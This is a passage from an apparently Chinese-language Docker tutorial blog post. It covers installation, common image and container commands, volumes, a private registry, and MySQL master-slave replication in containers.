fast</span><br></code></pre></td></tr></table></figure></li><li><p>安装Docker CE</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">yum install docker-<span class="hljs-keyword">ce</span> docker-<span class="hljs-keyword">ce</span>-cli containerd.io<br></code></pre></td></tr></table></figure></li><li><p>启动Docker</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">systemctl <span class="hljs-literal">start</span> docker<br></code></pre></td></tr></table></figure></li><li><p>测试</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">docker <span class="hljs-built_in">run</span> hello-world<br></code></pre></td></tr></table></figure></li></ol><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221206014337467.png" alt="image-20221206014337467" style="zoom:50%;" /><ol start="10"><li><p>卸载命令</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata">systemctl stop docker<br>yum remove docker-ce docker-ce-<span class="hljs-keyword">cli</span> containerd.io<br><span class="hljs-keyword">rm</span> -rf /<span class="hljs-keyword">var</span>/lib/docker<br><span class="hljs-keyword">rm</span> -rf /<span class="hljs-keyword">var</span>/lib/containerd<br></code></pre></td></tr></table></figure></li></ol><h3 id="1-4-run命令运行流程"><a href="#1-4-run命令运行流程" class="headerlink" title="1.4 run命令运行流程"></a>1.4 run命令运行流程</h3><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221206015504717.png" alt="image-20221206015504717" style="zoom:50%;" /><h3 id="1-5-为什么Docker比VM虚拟机快？"><a href="#1-5-为什么Docker比VM虚拟机快？" class="headerlink" title="1.5 为什么Docker比VM虚拟机快？"></a>1.5 为什么Docker比VM虚拟机快？</h3><ol><li><p>docker有着比虚拟机更少的抽象层 </p><p>由于docker不需要Hypervisor(虚拟机)实现硬件资源虚拟化,运行在docker容器上的程序直接使用的都是实际物理机的硬件资源。因此在CPU、内存利用率上docker将会在效率上有明显优势。 </p></li><li><p>docker利用的是宿主机的内核,而不需要加载操作系统OS内核 </p><p>当新建一个容器时,docker不需要和虚拟机一样重新加载一个操作系统内核。进而避免引寻、加载操作系统内核返回等比较费时费资源的过程,当新建一个虚拟机时,虚拟机软件需要加载OS,返回新建过程是分钟级别的。而docker由于直接利用宿主机的操作系统,则省略了返回过程,因此新建一个docker容器只需要几秒钟。</p></li></ol><h2 id="2-Docker常用命令"><a href="#2-Docker常用命令" class="headerlink" title="2. Docker常用命令"></a>2. Docker常用命令</h2><h3 id="2-1-启动类命令"><a href="#2-1-启动类命令" class="headerlink" title="2.1 启动类命令"></a>2.1 启动类命令</h3><ol><li><p>启动Docker</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">systemctl <span class="hljs-literal">start</span> docker<br></code></pre></td></tr></table></figure></li><li><p>停止Docker</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">systemctl stop docker<br></code></pre></td></tr></table></figure></li><li><p>重启Docker</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">systemctl restart docker</span><br></code></pre></td></tr></table></figure></li><li><p>查看Docker状态</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">systemctl status docker</span><br></code></pre></td></tr></table></figure></li><li><p>开机启动</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">systemctl <span class="hljs-built_in">enable</span> docker<br></code></pre></td></tr></table></figure></li><li><p>查看Docker概要信息</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">docker</span> <span class="hljs-literal">info</span><br></code></pre></td></tr></table></figure></li></ol><h3 id="2-2-镜像命令"><a href="#2-2-镜像命令" class="headerlink" title="2.2 镜像命令"></a>2.2 镜像命令</h3><ol><li><p>列出本地主机的镜像</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">docker images<br>docker images -<span class="hljs-selector-tag">a</span><br>docker images -aq<br></code></pre></td></tr></table></figure></li><li><p>查询某个镜像</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> search<span class="hljs-meta"> [IMAGE]</span><br></code></pre></td></tr></table></figure></li><li><p>拉取镜像，不加tag时默认采用最新版本latest</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> pull<span class="hljs-meta"> [IMAGE:TAG]</span><br></code></pre></td></tr></table></figure></li><li><p>查看镜像&#x2F;容器&#x2F;数据卷所占的空间</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker system <span class="hljs-built_in">df</span><br></code></pre></td></tr></table></figure></li><li><p>删除某个镜像</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> rmi<span class="hljs-meta"> [IMAGE ID]</span><br></code></pre></td></tr></table></figure></li><li><p>删除所有镜像</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">docker rmi <span class="hljs-constructor">$(<span class="hljs-params">docker</span> <span class="hljs-params">images</span> -<span class="hljs-params">q</span>)</span><br></code></pre></td></tr></table></figure></li></ol><h3 id="2-3-容器命令"><a href="#2-3-容器命令" class="headerlink" title="2.3 容器命令"></a>2.3 容器命令</h3><ol><li><p>新建并启动容器</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">docker run <span class="hljs-selector-attr">[OPTIONS]</span> **IMAGE** <span class="hljs-selector-attr">[COMMAND]</span> <span class="hljs-selector-attr">[ARG...]</span><br></code></pre></td></tr></table></figure><p>OPTIONS说明（常用）：有些是一个减号，有些是两个减号 </p><ul><li>–name：为容器指定一个名称</li><li>-d: 后台运行容器并返回容器ID，也即启动守护式容器(后台运行)</li><li>-i：以交互模式运行容器，通常与 -t 同时使用</li><li>-t：为容器重新分配一个伪输入终端，通常与 -i 同时使用；也即 启动交互式容器(前台有伪终端，等待交互) </li><li>-P: 随机 端口映射，大写P </li><li>-p: 指定 端口映射，小写p</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker run -it ubuntu <span class="hljs-regexp">/bin/</span>bash <span class="hljs-comment"># 与ubuntu进行交互</span><br><span class="hljs-keyword">exit</span> <span class="hljs-comment"># 退出并停止容器</span><br>ctrl + p + q <span class="hljs-comment"># 退出不停止容器</span><br>docker exec -it [CONTAINER ID] <span class="hljs-regexp">/bin/</span>bash<br></code></pre></td></tr></table></figure><ul><li>attach 直接进入容器启动命令的终端，不会启动新的进程。用exit退出，会导致容器的停止。</li><li>exec 是在容器中打开新的终端，并且可以启动新的进程。用exit退出，不会导致容器的停止。</li><li>一般使用 docker exec 命令，因为退出容器终端，不会导致容器的停止。</li></ul></li><li><p>列出所有正在运行的容器</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">docker ps <span class="hljs-selector-attr">[OPTIONS]</span> <br></code></pre></td></tr></table></figure><p>OPTIONS说明（常用）： </p><ul><li>-a：列出当前所有 正在运行 的容器 + 历史上运行过 的 </li><li>-l：显示最近创建的容器。 </li><li>-n：显示最近n个创建的容器。 </li><li>-q：静默模式，只显示容器编号。</li></ul></li><li><p>启动已停止运行的容器</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">docker <span class="hljs-keyword">start</span> [CONTAINER ID <span class="hljs-keyword">or</span> <span class="hljs-type">NAME</span>]<br></code></pre></td></tr></table></figure></li><li><p>重启容器</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">docker <span class="hljs-keyword">restart</span> [CONTAINER ID <span class="hljs-keyword">or</span> <span class="hljs-type">NAME</span>]<br></code></pre></td></tr></table></figure></li><li><p>停止容器</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs fortran">docker <span class="hljs-keyword">stop</span> [CONTAINER ID or <span class="hljs-keyword">NAME</span>]<br>docker kill [CONTAINER ID or <span class="hljs-keyword">NAME</span>] # 强制停止<br></code></pre></td></tr></table></figure></li><li><p>停止所有容器</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">docker stop <span class="hljs-constructor">$(<span class="hljs-params">docker</span> <span class="hljs-params">ps</span> -<span class="hljs-params">aq</span>)</span><br></code></pre></td></tr></table></figure></li><li><p>删除容器</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> rm<span class="hljs-meta"> [CONTAINER ID]</span><br></code></pre></td></tr></table></figure></li><li><p>删除所有容器</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">docker rm <span class="hljs-constructor">$(<span class="hljs-params">docker</span> <span class="hljs-params">ps</span> -<span class="hljs-params">aq</span>)</span><br></code></pre></td></tr></table></figure></li></ol><h3 id="2-4-Redis演示"><a href="#2-4-Redis演示" class="headerlink" title="2.4 Redis演示"></a>2.4 Redis演示</h3><ol><li><p>Redis前台交互式启动</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run -it redis:<span class="hljs-number">6</span>.<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br></code></pre></td></tr></table></figure></li><li><p>Redis后台守护式启动</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run -d redis:<span class="hljs-number">6</span>.<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">docker</span> logs<span class="hljs-meta"> [CONTAINER ID]</span><br></code></pre></td></tr></table></figure></li><li><p>查看容器内运行的进程</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">docker <span class="hljs-attribute">top</span> <span class="hljs-selector-attr">[CONTAINER ID]</span><br></code></pre></td></tr></table></figure></li><li><p>查看容器内部细节</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> inspect<span class="hljs-meta"> [CONTAINER ID]</span><br></code></pre></td></tr></table></figure></li><li><p>从容器内拷贝文件到主机上</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">docker</span> <span class="hljs-meta">cp</span>  容器ID:容器内路径 目的主机路径<br></code></pre></td></tr></table></figure></li><li><p>导入和导出容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker <span class="hljs-built_in">cp</span>  容器ID:容器内路径 目的主机路径<br><span class="hljs-built_in">cat</span> 文件名.tar | docker import - 镜像用户/镜像名:镜像版本号<br></code></pre></td></tr></table></figure></li></ol><h2 id="3-Docker镜像"><a href="#3-Docker镜像" class="headerlink" title="3. Docker镜像"></a>3. Docker镜像</h2><h3 id="3-1-基础概念"><a href="#3-1-基础概念" class="headerlink" title="3.1 基础概念"></a>3.1 基础概念</h3><p>是一种轻量级、可执行的独立软件包，它包含运行某个软件所需的所有内容，我们把应用程序和配置依赖打包好形成一个可交付的运行环境(包括代码、运行时需要的库、环境变量和配置文件等)，这个打包好的运行环境就是image镜像文件。  </p><p>只有通过这个镜像文件才能生成Docker容器实例(类似Java中new出来一个对象)。 </p><p>UnionFS（联合文件系统）：Union文件系统（UnionFS）是一种分层、轻量级并且高性能的文件系统，它支持 对文件系统的修改作为一次提交来一层层的叠加， 同时可以将不同目录挂载到同一个虚拟文件系统下(unite several directories into a single virtual filesystem)。Union 文件系统是 Docker 镜像的基础。 镜像可以通过分层来进行继承 ，基于基础镜像（没有父镜像），可以制作各种具体的应用镜像。</p><ul><li><p>特性：一次同时加载多个文件系统，但从外面看起来，只能看到一个文件系统，联合加载会把各层文件系统叠加起来，这样最终的文件系统会包含所有底层的文件和目录 </p></li><li><p>重点理解：</p><p>Docker镜像层都是只读的，容器层是可写的。</p><p>当容器启动时，一个新的可写层被加载到镜像的顶部。这一层通常被称作“容器层”，“容器层”之下的都叫“镜像层”。</p><p>所有对容器的改动都只会发生在容器层中。只有容器层是可写的，容器层下面的所有镜像层都是只读的。</p></li></ul><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221206131046744.png" alt="image-20221206131046744" style="zoom:50%;" /><h3 id="3-2-commit案例"><a href="#3-2-commit案例" class="headerlink" title="3.2 commit案例"></a>3.2 commit案例</h3><ol><li><p>Docker Ubuntu容器内执行安装vim命令</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">apt-<span class="hljs-built_in">get</span> update <br>apt-<span class="hljs-built_in">get</span> -y install vim<br></code></pre></td></tr></table></figure></li><li><p>提交新的ubuntu</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">docker commit <span class="hljs-attribute">-m</span>=<span class="hljs-string">&quot;提交的描述信息&quot;</span> <span class="hljs-attribute">-a</span>=<span class="hljs-string">&quot;作者&quot;</span> 容器ID 要创建的目标镜像名:[标签名]<br></code></pre></td></tr></table></figure></li></ol><p>Docker中的镜像分层， 支持通过扩展现有镜像，创建新的镜像 。类似Java继承于一个Base基础类，自己再按需扩展。 </p><p>新镜像是从 base 镜像一层一层叠加生成的。每安装一个软件，就在现有镜像的基础上增加一层</p><h3 id="3-3-本地镜像发布到私有库"><a href="#3-3-本地镜像发布到私有库" class="headerlink" title="3.3 本地镜像发布到私有库"></a>3.3 本地镜像发布到私有库</h3><ol><li><p>下载镜像Docker Registry</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker pull registry</span><br></code></pre></td></tr></table></figure></li><li><p>运行私有库Registry，相当于本地有个私有Docker hub</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">docker run -d -p <span class="hljs-number">5000</span><span class="hljs-symbol">:</span><span class="hljs-number">5000</span>  -v /zzyyuse/myregistry/<span class="hljs-symbol">:/tmp/registry</span> --privileged=<span class="hljs-literal">true</span> registry<br></code></pre></td></tr></table></figure><p>默认情况，仓库被创建在容器的&#x2F;var&#x2F;lib&#x2F;registry目录下，建议自行用容器卷映射，方便于宿主机联调 </p></li><li><p>curl查看私有库镜像</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -XGET http:<span class="hljs-regexp">//</span><span class="hljs-number">10.249</span>.<span class="hljs-number">238.5</span>:<span class="hljs-number">5000</span><span class="hljs-regexp">/v2/</span>_catalog<br></code></pre></td></tr></table></figure></li><li><p>将需要发布的镜像tag修改为符合私服规范的tag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> tag  myubuntu:<span class="hljs-number">0</span>.<span class="hljs-number">1</span>  <span class="hljs-number">10.249.238.5:5000</span>/myubuntu:<span class="hljs-number">0</span>.<span class="hljs-number">1</span> <br></code></pre></td></tr></table></figure></li><li><p>push推送到私有库</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> push <span class="hljs-number">192.168.111.162:5000</span>/zzyyubuntu:<span class="hljs-number">1</span>.<span class="hljs-number">2</span> <br></code></pre></td></tr></table></figure></li></ol><h2 id="4-Docker容器数据卷"><a href="#4-Docker容器数据卷" class="headerlink" title="4. Docker容器数据卷"></a>4. Docker容器数据卷</h2><p>一句话：类似Redis的数据持久化机制 RDB与AOF</p><p>将docker容器内的数据保存进宿主机的磁盘中</p><p>运行一个带有容器卷存储功能的容器实例：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">docker <span class="hljs-built_in">run</span> -it <span class="hljs-attribute">--privileged</span>=<span class="hljs-literal">true</span> -v /宿主机绝对路径目录:/容器内目录   镜像名<br></code></pre></td></tr></table></figure><ol><li>数据卷可在容器之间共享或重用数据 </li><li>卷中的更改可以直接实时生效到宿主机</li><li>数据卷中的更改不会包含在镜像的更新中</li><li>数据卷的生命周期一直持续到没有容器使用它为止</li></ol><p>数据卷案例</p><ol><li><p>映射添加数据卷</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">docker <span class="hljs-built_in">run</span> -it <span class="hljs-attribute">--privileged</span>=<span class="hljs-literal">true</span> -v /tmp/host_data:/tmp/docker_data <span class="hljs-attribute">--name</span>=u1 ubuntu<br></code></pre></td></tr></table></figure></li><li><p>在docker容器中添加文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /tmp/docker_data/<br><span class="hljs-built_in">touch</span> dockerin.txt<br></code></pre></td></tr></table></figure></li><li><p>在宿主机对应目录下查看，同步成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /tmp/host_data/<br><span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure></li><li><p>查看数据卷是否挂载成功</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">docker <span class="hljs-keyword">inspect</span> 容器ID<br></code></pre></td></tr></table></figure></li></ol><p>读写限制：容器实例内部被限制，只能读取不能写</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">docker <span class="hljs-built_in">run</span> -it <span class="hljs-attribute">--privileged</span>=<span class="hljs-literal">true</span> -v /宿主机绝对路径目录:/容器内目录:ro  镜像名<br></code></pre></td></tr></table></figure><h2 id="5-Docker-MySQL主从复制"><a href="#5-Docker-MySQL主从复制" class="headerlink" title="5. Docker MySQL主从复制"></a>5. Docker MySQL主从复制</h2><ol><li><p>新建主服务器容器实例5007</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker run -p <span class="hljs-number">3307</span>:<span class="hljs-number">3306</span> --name mysql-master -v <span class="hljs-regexp">/mydata/my</span>sql-master<span class="hljs-regexp">/log:/</span>var<span class="hljs-regexp">/log/my</span>sql -v <span class="hljs-regexp">/mydata/my</span>sql-master<span class="hljs-regexp">/data:/</span>var<span class="hljs-regexp">/lib/my</span>sql -v <span class="hljs-regexp">/mydata/my</span>sql-master<span class="hljs-regexp">/conf:/</span>etc<span class="hljs-regexp">/mysql/</span>conf.d -e MYSQL_ROOT_PASSWORD=root -d mysql:<span class="hljs-number">8.0</span>.<span class="hljs-number">31</span><br></code></pre></td></tr></table></figure></li><li><p>进入&#x2F;mydata&#x2F;mysql-master&#x2F;conf目录下新建my.cnf</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[mysqld]</span> <br><span class="hljs-comment">## 设置server_id，同一局域网中需要唯一 </span><br><span class="hljs-attr">server_id</span>=<span class="hljs-number">101</span>  <br><span class="hljs-comment">## 指定不需要同步的数据库名称 </span><br><span class="hljs-attr">binlog-ignore-db</span>=mysql   <br><span class="hljs-comment">## 开启二进制日志功能 </span><br><span class="hljs-attr">log-bin</span>=mall-mysql-bin   <br><span class="hljs-comment">## 设置二进制日志使用内存大小（事务） </span><br><span class="hljs-attr">binlog_cache_size</span>=<span class="hljs-number">1</span>M   <br><span class="hljs-comment">## 设置使用的二进制日志格式（mixed,statement,row） </span><br><span class="hljs-attr">binlog_format</span>=mixed   <br><span class="hljs-comment">## 二进制日志过期清理时间。默认值为0，表示不自动清理。 </span><br><span class="hljs-attr">expire_logs_days</span>=<span class="hljs-number">7</span>   <br><span class="hljs-comment">## 跳过主从复制中遇到的所有错误或指定类型的错误，避免slave端复制中断。 </span><br><span class="hljs-comment">## 如：1062错误是指一些主键重复，1032错误是因为主从数据库数据不一致 </span><br><span class="hljs-attr">slave_skip_errors</span>=<span class="hljs-number">1062</span> <br></code></pre></td></tr></table></figure></li><li><p>修改完配置后重启master实例</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">docker restart mysql-<span class="hljs-literal">master</span><br></code></pre></td></tr></table></figure></li><li><p>进入mysql-master容器</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">docker exec -it mysql-<span class="hljs-keyword">master</span> <span class="hljs-title">/bin</span>/bash<br>mysql -uroot -proot<br></code></pre></td></tr></table></figure></li><li><p>master容器实例内创建数据同步用户</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">&#x27;slave&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;123456&#x27;</span>;<br><span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">REPLICATION</span> SLAVE, <span class="hljs-keyword">REPLICATION</span> CLIENT <span class="hljs-keyword">ON</span> *.* <span class="hljs-keyword">TO</span> <span class="hljs-string">&#x27;slave&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span>;<br><br>MySQL8额外步骤：<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">&#x27;slave&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> IDENTIFIED <span class="hljs-keyword">WITH</span> mysql_native_password <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;123456&#x27;</span>;<br>flush <span class="hljs-keyword">privileges</span>;<br></code></pre></td></tr></table></figure></li><li><p>新建从服务器容器实例3308（与主机密码不要设置为一样的）</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker run -p <span class="hljs-number">3308</span>:<span class="hljs-number">3306</span> --name mysql-slave -v <span class="hljs-regexp">/mydata/my</span>sql-slave<span class="hljs-regexp">/log:/</span>var<span class="hljs-regexp">/log/my</span>sql -v <span class="hljs-regexp">/mydata/my</span>sql-slave<span class="hljs-regexp">/data:/</span>var<span class="hljs-regexp">/lib/my</span>sql -v <span class="hljs-regexp">/mydata/my</span>sql-slave<span class="hljs-regexp">/conf:/</span>etc<span class="hljs-regexp">/mysql/</span>conf.d -e MYSQL_ROOT_PASSWORD=<span class="hljs-number">123456</span> -d mysql:<span class="hljs-number">8.0</span>.<span class="hljs-number">31</span><br></code></pre></td></tr></table></figure></li><li><p>进入&#x2F;mydata&#x2F;mysql-slave&#x2F;conf目录下新建my.cnf</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[mysqld]</span> <br><span class="hljs-comment">## 设置server_id，同一局域网中需要唯一 </span><br><span class="hljs-attr">server_id</span>=<span class="hljs-number">102</span> <br><span class="hljs-comment">## 指定不需要同步的数据库名称 </span><br><span class="hljs-attr">binlog-ignore-db</span>=mysql   <br><span class="hljs-comment">## 开启二进制日志功能，以备Slave作为其它数据库实例的Master时使用 </span><br><span class="hljs-attr">log-bin</span>=mall-mysql-slave1-bin   <br><span class="hljs-comment">## 设置二进制日志使用内存大小（事务） </span><br><span class="hljs-attr">binlog_cache_size</span>=<span class="hljs-number">1</span>M   <br><span class="hljs-comment">## 设置使用的二进制日志格式（mixed,statement,row） </span><br><span class="hljs-attr">binlog_format</span>=mixed   <br><span class="hljs-comment">## 二进制日志过期清理时间。默认值为0，表示不自动清理。 </span><br><span class="hljs-attr">expire_logs_days</span>=<span class="hljs-number">7</span>   <br><span class="hljs-comment">## 跳过主从复制中遇到的所有错误或指定类型的错误，避免slave端复制中断。 </span><br><span class="hljs-comment">## 如：1062错误是指一些主键重复，1032错误是因为主从数据库数据不一致 </span><br><span class="hljs-attr">slave_skip_errors</span>=<span class="hljs-number">1062</span>   <br><span class="hljs-comment">## relay_log配置中继日志 </span><br><span class="hljs-attr">relay_log</span>=mall-mysql-relay-bin   <br><span class="hljs-comment">## log_slave_updates表示slave将复制事件写进自己的二进制日志 </span><br><span class="hljs-attr">log_slave_updates</span>=<span class="hljs-number">1</span>   <br><span class="hljs-comment">## slave设置为只读（具有super权限的用户除外） </span><br><span class="hljs-attr">read_only</span>=<span class="hljs-number">1</span> <br></code></pre></td></tr></table></figure></li><li><p>修改完配置后重启slave实例</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">docker restart mysql-<span class="hljs-literal">slave</span><br></code></pre></td></tr></table></figure></li><li><p>在主数据库中查看主从同步状态，得到file与position（用于从数据库配置参数）</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">show master status;<br><br><span class="hljs-section">mysql&gt; show master status;</span><br><span class="hljs-section">+-----------------------+----------+--------------+------------------+-------------------+</span><br><span class="hljs-section">| File                  | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |</span><br><span class="hljs-section">+-----------------------+----------+--------------+------------------+-------------------+</span><br><span class="hljs-section">| mall-mysql-bin.000004 |      714 |              | mysql            |                   |</span><br><span class="hljs-section">+-----------------------+----------+--------------+------------------+-------------------+</span><br></code></pre></td></tr></table></figure></li><li><p>在从数据库中配置主从复制</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">change master <span class="hljs-keyword">to</span> <span class="hljs-attribute">master_host</span>=<span class="hljs-string">&#x27;10.249.238.5&#x27;</span>, <span class="hljs-attribute">master_user</span>=<span class="hljs-string">&#x27;slave&#x27;</span>, <span class="hljs-attribute">master_password</span>=<span class="hljs-string">&#x27;123456&#x27;</span>, <span class="hljs-attribute">master_port</span>=3307, <span class="hljs-attribute">master_log_file</span>=<span class="hljs-string">&#x27;mall-mysql-bin.000004&#x27;</span>, <span class="hljs-attribute">master_log_pos</span>=714, <span class="hljs-attribute">master_connect_retry</span>=30; <br></code></pre></td></tr></table></figure><p>master_host：主数据库的IP地址； </p><p>master_port：主数据库的运行端口； 